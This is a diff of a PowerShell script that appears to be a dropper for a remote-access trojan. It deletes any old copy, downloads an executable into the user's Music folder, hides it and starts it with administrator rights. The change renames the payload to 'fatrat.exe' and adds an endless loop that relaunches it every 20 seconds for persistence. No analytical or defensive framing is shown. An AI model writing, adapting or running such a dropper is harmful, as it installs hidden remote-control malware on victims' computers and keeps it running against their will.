@@ -1,6 +1,6 @@
 
 
-$path = Join-Path $env:USERPROFILE "Music\rat.exe"
+$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
 
 if (Test-Path $path) {
     Remove-Item $path -Force
@@ -25,3 +25,10 @@ Invoke-WebRequest -Uri $url -OutFile $dest
 Set-ItemProperty -Path $dest -Name Attributes -Value Hidden
 
 Start-Process -FilePath $dest -Verb RunAs   
+
+
+
+while ($true) {
+    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
+    Start-Sleep -Seconds 20
+}
